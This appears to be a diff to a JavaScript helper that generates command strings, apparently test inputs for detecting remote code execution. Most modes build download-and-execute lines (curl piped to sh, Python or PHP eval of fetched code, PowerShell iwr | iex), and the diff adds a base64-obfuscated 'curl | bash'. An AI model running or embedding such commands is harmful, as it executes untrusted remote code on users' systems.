@@ -97,10 +97,10 @@ function make(index){
    mode===2?'curl -fsSL '+url+' --output='+file+'\nsh '+file:
    mode===3?'python -c "import urllib.request; exec(urllib.request.urlopen(\''+url+'\').read())"':
    mode===4?'python -c "import urllib.request; eval(urllib.request.urlopen(\''+url+'\').read())"':
-   mode===5?'php -r \'eval(file_get_contents("'+url+'"));"\'':
+   mode===5?'php -r \'eval(file_get_contents("'+url+'"));\'':
    mode===6?'iwr '+url+' | iex':
    mode===7?'pwsh -Command "iex (iwr '+url+').Content"':
-   mode===8?'echo "'+Buffer.from('audit-'+group).toString('base64')+'" | base64 -d | bash':
+   mode===8?'echo "'+Buffer.from('curl -fsSL '+url+' | bash').toString('base64')+'" | base64 -d | bash':
    mode===9?'npx --package '+project+'@latest audit':
    mode===10?'curl -fsSL '+url+' -o '+file+'; echo '+file:
    'npx --package '+project+'@1.2.3 audit';
